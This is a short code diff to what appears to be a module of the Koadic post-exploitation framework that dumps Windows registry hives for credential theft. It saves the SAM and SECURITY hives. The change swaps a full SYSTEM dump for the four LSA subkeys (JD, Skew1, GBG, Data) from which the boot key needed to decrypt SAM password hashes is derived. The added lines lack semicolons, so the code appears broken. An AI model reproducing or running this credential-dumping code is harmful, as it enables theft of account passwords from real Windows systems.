@@ -21,7 +21,11 @@ try
 {
     DumpHive("SAM", "42SAM");
     DumpHive("SECURITY", "42SECURITY");
-    DumpHive("SYSTEM", "42SYSTEM");
+    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", "42JD")
+    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", "42Skew1")
+    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG", "42GBG")
+    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data", "42Data")
+    // DumpHive("SYSTEM", "42SYSTEM");
 
     Koadic.work.report("Complete");
 }
